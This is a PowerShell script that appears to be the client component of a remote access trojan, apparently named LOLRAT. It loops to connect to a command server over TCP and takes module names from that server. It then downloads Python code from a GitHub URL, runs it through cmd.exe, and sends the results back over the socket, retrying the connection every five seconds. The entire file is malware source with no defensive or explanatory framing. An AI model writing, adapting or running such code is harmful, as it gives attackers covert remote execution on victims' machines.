while ($true) {
    try {
        $serverHost = '127.0.0.1'
        $port = 12345

        try {
            $clientSocket = New-Object System.Net.Sockets.TcpClient
            $clientSocket.Connect($serverHost, $port)
            Write-Host 'Connected to the server'
            while ($true) {
                $data = New-Object byte[] 1024
                $stream = $clientSocket.GetStream()
                $count = $stream.Read($data, 0, $data.Length)
                $receivedData = [System.Text.Encoding]::UTF8.GetString($data, 0, $count)

                # Split the received data into "exec" and the command
                $parts = $receivedData -split '\$'
                if ($parts.Length -ne 2) {
                    Write-Host "Invalid command format: $receivedData"
                    continue
                }

                $name = $parts[0]
                $url = 'https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/' + $name + '.py'

                Write-Host "Fetching content from: $url"

                $content = Invoke-RestMethod -Uri $url

                Write-Host "Content fetched."

                if ($content -ne $null) {
                    try {
                        $command = "python -c `"$content`""

                        Write-Host "Executing command: $command"

                        $process = Start-Process -FilePath 'cmd.exe' -ArgumentList "/c", $command -NoNewWindow -Wait -PassThru

                        $output = $process.StandardOutput.ReadToEnd()
                        $error = $process.StandardError.ReadToEnd()

                        if ($process.ExitCode -eq 0) {
                            $clientSocket.GetStream().Write([System.Text.Encoding]::UTF8.GetBytes($output), 0, $output.Length)
                        } else {
                            $clientSocket.GetStream().Write([System.Text.Encoding]::UTF8.GetBytes("Error:\n$error"), 0, $error.Length)
                        }
                    } catch {
                        Write-Host "An error occurred during command execution: $_"
                    }
                }
            }
        } catch [System.Net.Sockets.SocketException] {
            Write-Host 'Connection refused. Retrying in 5 seconds...'
            Start-Sleep -Seconds 5
        } catch {
            Write-Host "An error occurred: $_"
        } finally {
            if ($clientSocket -ne $null) {
                $clientSocket.Close()
            }
        }
    } catch {
        Write-Host "An error occurred: $_"
    }
}